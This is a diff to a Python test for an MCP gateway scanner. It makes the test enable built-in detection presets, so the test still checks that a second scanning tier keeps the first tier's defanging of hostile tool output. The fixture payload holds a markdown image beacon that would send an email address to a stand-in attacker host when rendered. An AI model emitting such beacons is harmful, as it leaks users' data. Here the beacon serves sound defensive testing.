@@ -6,10 +6,29 @@ reverted the defang (restoring the raw ![ auto-render) while masking the co-loca
 The fix re-binds targets to the post-Tier-1 payload so Tier-2 sees the defanged text.
 """
 import asyncio
+import os
 import unittest.mock as mock
+from contextlib import contextmanager
 
 import mcp_scan_orchestrator as orch
 from scanner import ScanVerdict
+
+
+# policy-driven-detection cutover (task 9): the Tier-1 PRESET defang machinery this test
+# exercises is now EFFECTIVE-DEFAULT OFF (a zero-policy org is passthrough). The RETAINED
+# preset machinery is reachable via the explicit opt-in env; enable it for the scan so the
+# Tier-1 beacon-defang runs and the Tier-2-preserves-defang invariant is still tested.
+@contextmanager
+def _builtin_presets_enabled():
+    prev = os.environ.get("GATEWAY_MCP_DEFAULT_DETECTION")
+    os.environ["GATEWAY_MCP_DEFAULT_DETECTION"] = "true"
+    try:
+        yield
+    finally:
+        if prev is None:
+            os.environ.pop("GATEWAY_MCP_DEFAULT_DETECTION", None)
+        else:
+            os.environ["GATEWAY_MCP_DEFAULT_DETECTION"] = prev
 
 # Beacon carries a redact_all-maskable value (the email) so the Tier-2 redact setter fires.
 PAYLOAD = {"result": "See ![a](https://attacker.io/c?leak=john.doe@corp.example) now"}
@@ -34,7 +53,8 @@ def _run(tier2_on):
     ctrl = {**CTRL}
     if not tier2_on:
         ctrl = {**CTRL, "tier2_output": {**CTRL["tier2_output"], "enabled": False}}
-    with mock.patch.object(orch, "_get_input_scanner", return_value=_RedactScanner()), \
+    with _builtin_presets_enabled(), \
+         mock.patch.object(orch, "_get_input_scanner", return_value=_RedactScanner()), \
          mock.patch.object(orch, "_get_policy_sync", return_value=None):
         out, res = asyncio.run(orch.scan_mcp_payload(
             dict(PAYLOAD), scan_direction="output", enforcement="redact",
